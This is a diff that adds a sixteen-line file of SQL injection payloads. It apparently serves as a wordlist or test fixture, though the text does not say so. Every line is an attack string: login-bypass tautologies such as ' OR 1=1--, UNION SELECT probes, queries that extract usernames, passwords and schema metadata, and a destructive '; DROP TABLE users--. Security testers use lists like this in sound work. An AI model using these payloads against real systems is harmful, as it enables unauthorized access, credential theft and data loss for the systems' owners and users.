@@ -1,0 +1,16 @@
+' OR '1'='1
+1' OR '1'='1' --
+admin'--
+' UNION SELECT NULL--
+1' AND '1'='2
+'; DROP TABLE users--
+1' UNION SELECT username, password FROM users--
+' OR 1=1--
+" OR 1=1--
+' OR 'x'='x
+') OR ('x'='x
+' AND id IS NULL; --
+admin' or '1'='1'/*
+' OR 1=1#
+' UNION ALL SELECT NULL,NULL,NULL--
+1' AND 1=2 UNION SELECT table_name,column_name,3 FROM information_schema.columns--
